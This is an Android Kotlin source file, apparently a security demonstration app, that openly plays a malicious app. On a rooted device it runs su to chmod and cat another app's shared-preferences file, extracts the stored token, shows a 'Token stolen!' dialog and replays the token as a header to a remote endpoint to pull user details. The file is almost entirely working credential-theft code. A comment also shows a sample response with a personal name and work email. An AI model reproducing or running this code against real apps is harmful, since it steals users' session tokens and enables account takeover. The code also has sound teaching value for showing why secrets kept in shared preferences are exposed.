package com.dimanem.security.root.example.app2

import android.os.Bundle
import android.preference.PreferenceManager
import android.support.v7.app.AlertDialog
import android.support.v7.app.AppCompatActivity
import org.json.XML
import java.io.File
import java.lang.Exception
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.widget.Toast
import com.nostra13.universalimageloader.core.ImageLoader
import kotlinx.android.synthetic.main.activity_main.*
import kotlinx.android.synthetic.main.layout_user_details.*
import okhttp3.*
import org.json.JSONObject
import java.io.IOException

class MainActivity : AppCompatActivity() {

  var token: String? = null

  override fun onCreate(savedInstanceState: Bundle?) {
    super.onCreate(savedInstanceState)
    setContentView(R.layout.activity_main)

    // TODO find a better way to read shared prefs file
    try {
      token = getSharedPrefsFile()!!.let { file ->
        getFileContent(file)!!.let { xml ->
          XML.toJSONObject(xml)!!.let { json ->
            json.getJSONObject("map")
              .getJSONObject("string")
              .getString("content")
          }
        }
      }
      showStolenTokenDialog(token!!)
    } catch (e: Exception) {
      Toast.makeText(
        this, "Failed to read token ${e.localizedMessage}",
        Toast.LENGTH_SHORT
      ).show()
    }

    btnGetUserData.setOnClickListener {
      if (!token.isNullOrEmpty()) {
        fetchUserInfo(token!!)
      } else {
        Toast.makeText(this, "Token is missing!", Toast.LENGTH_SHORT).show()
      }
    }
  }

  private fun fetchUserInfo(token: String) {
    val client = OkHttpClient()
    val request = Request.Builder()
      .url("http://demo8072814.mockable.io/secret")
      .addHeader("Token", token)
      .build()

    client.newCall(request).enqueue(object : Callback {
      override fun onFailure(call: Call, e: IOException) {
        Log.e(TAG, "Request error ${e.localizedMessage}")
      }

      override fun onResponse(call: Call, response: Response) {
        /*
        {
          "firstname": "Andrey",
          "lastname": "Eidelman",
          "job": "Security Architect",
          "email": "andreye@gett.com"
        }
        */
        val body = response.body()!!.string()
        val bodyJson = JSONObject(body)
        val fullName = bodyJson.getString("firstname") + " " + bodyJson.getString("lastname")
        val imageUrl = bodyJson.getString("image")
        Handler(Looper.getMainLooper()).post {
          tvUserName.text = fullName
          tvJobTitle.text = bodyJson.getString("job")
          tvEmail.text = bodyJson.getString("email")
          if (!imageUrl.isNullOrEmpty()) {
            ImageLoader.getInstance().displayImage(imageUrl, ivUserImage)
          }
        }
        Log.i(TAG, "Request success $body")
        response.body()
      }
    })
  }

  private fun getSharedPrefsFile(): File? {
    val securityDemoPackageName = "com.dimanem.security.example.demo"
    val sharedPrefs = PreferenceManager
      .getDefaultSharedPreferences(createPackageContext(securityDemoPackageName, 0))
    val field = sharedPrefs.javaClass.getDeclaredField("mFile")
    if (!field.isAccessible) {
      field.isAccessible = true
    }
    val sharedPrefsFile = field.get(sharedPrefs as Any) as File
    val cmd = StringBuilder().apply {
      append("chmod -R 0777 \"")
      append(sharedPrefsFile)
      append("\"")
    }.toString()
    Runtime.getRuntime().exec(arrayOf("su", "-c", cmd)).waitFor()
    return sharedPrefsFile
  }

  private fun getFileContent(file: File): String? {
    val readFileContentCmd = StringBuilder().apply {
      append("cat \"")
      append(file)
      append("\"")
    }.toString()
    return Runtime.getRuntime().exec(arrayOf("su", "-c", readFileContentCmd))
      .inputStream.bufferedReader().use {
      it.readText()
    }
  }

  private fun showStolenTokenDialog(token: String) {
    AlertDialog.Builder(this)
      .setTitle("Token stolen!")
      .setMessage(token)
      .setCancelable(true)
      .setPositiveButton("Ok") { dialog, _ ->
        run {
          tvSecret.text = "Token: \n$token"
          dialog.dismiss()
        }
      }
      .create()
      .show()
  }

  companion object {
    const val TAG = "MaliciousApp"
  }
}
